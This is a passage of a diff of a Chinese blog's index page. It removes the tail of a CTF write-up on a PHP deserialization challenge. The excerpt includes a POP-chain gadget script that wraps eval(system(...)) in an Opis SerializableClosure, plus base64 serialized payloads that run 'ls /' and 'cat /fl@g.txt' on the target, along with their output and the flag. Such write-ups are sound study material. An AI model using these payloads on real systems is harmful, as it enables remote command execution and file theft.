class="title">flag</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; flag = <span class="keyword">new</span> \Method\Func\GetDefault();</span><br><span class="line">            <span class="keyword">$this</span> -&gt; value = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GetDefault</span> &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">source</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)  </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source = <span class="keyword">new</span> \Method\Func\GenerateFile();</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source -&gt; flag = <span class="string">&#x27;myTest&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Method</span>\<span class="title">Func</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">GenerateFile</span> &#123;</span><br><span class="line">        <span class="title">public</span> $<span class="title">flag</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$buffer</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$function</span> = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">eval</span>(system(<span class="string">&#x27;ls /&#x27;</span>)); &#125;;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; source -&gt; generate = <span class="keyword">new</span> \Opis\<span class="built_in">Closure</span>\SerializableClosure(<span class="variable">$function</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>将php文件放在<code>/www</code>文件夹下运行，得到序列化的结果（其实在php5中赋值一个对象在一个空变量中是会警告的<code>HP Warning:  Creating default object from empty value in /var/www/1.php on line 51</code>，在php8中就直接报错了）：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxODg6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6MzU6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdscyAvJykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwMmIzZjg4ZGMwMDAwMDAwMDE5NjUyZjhjIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>将作为post参数data传递，获得回显：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin dev etc f1@g.txt home lib media mnt opt proc root run sbin srv sys tmp usr var</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>修改<code>$function = function()&#123; eval(system(&#39;cat /fl@g.txt&#39;)); &#125;;</code>，重新序列化：</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TzoyMjoiQ29udHJvbFxTdGF0ZVxTdG9wSG9vayI6MTp7czoxMjoiACoAcHJvY2Vzc2VzIjthOjE6e2k6MDtPOjE3OiJGYWtlclxNeUdlbmVyYXRvciI6MTp7czoxNToiACoAZGVmYXVsdFZhbHVlIjtPOjE5OiJNZXRob2RcRnVuY1xHZXRGaWxlIjoyOntzOjI1OiIATWV0aG9kXEZ1bmNcR2V0RmlsZQBmbGFnIjtPOjIyOiJNZXRob2RcRnVuY1xHZXREZWZhdWx0IjoxOntzOjMwOiIATWV0aG9kXEZ1bmNcR2V0RGVmYXVsdABzb3VyY2UiO086MjQ6Ik1ldGhvZFxGdW5jXEdlbmVyYXRlRmlsZSI6Mzp7czo0OiJmbGFnIjtzOjY6Im15VGVzdCI7czo5OiIAKgBidWZmZXIiO047czo2OiJzb3VyY2UiO086ODoic3RkQ2xhc3MiOjE6e3M6ODoiZ2VuZXJhdGUiO0M6MzI6Ik9waXNcQ2xvc3VyZVxTZXJpYWxpemFibGVDbG9zdXJlIjoxOTc6e2E6NTp7czozOiJ1c2UiO2E6MDp7fXM6ODoiZnVuY3Rpb24iO3M6NDQ6ImZ1bmN0aW9uKCl7IGV2YWwoc3lzdGVtKCdjYXQgL2YxQGcudHh0JykpOyB9IjtzOjU6InNjb3BlIjtzOjI0OiJNZXRob2RcRnVuY1xHZW5lcmF0ZUZpbGUiO3M6NDoidGhpcyI7TjtzOjQ6InNlbGYiO3M6MzI6IjAwMDAwMDAwNzBkY2RiODIwMDAwMDAwMGFiNmZiZTVmIjt9fX19fXM6NToidmFsdWUiO3M6NDoidGVzdCI7fX19fQ&#x3D;&#x3D;</span><br></pre></td></tr></table></figure></li>
-<li><p>获得flag：</p>
-</li>
-</ul>
-<p><img src="https://typora-1302876324.cos.ap-shanghai.myqcloud.com/PicGo/202110020318190.png" alt="image-20211002021317038"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;16ed60c5-d06f-4974-931b-a26b07b5618d&#125;</span><br></pre></td></tr></table></figure>
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/10/05/xxc/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-    <section id="comments" style="margin:10px;padding:10px;background:#fff;">
-      <div id="vcomment" class="comment"></div> 
-<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script>
-   var notify = 'false' == true ? true : false;
-   var verify = 'false' == true ? true : false;
-    window.onload = function() {
-        new Valine({
-            el: '.comment',
-            notify: notify,
-            verify: verify,
-            app_id: "APP ID",
-            app_key: "APP KEY",
-            placeholder: "Just go go",
-            avatar:"retro"
-        });
-    }
-</script>
-
-    </section>
-  
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 
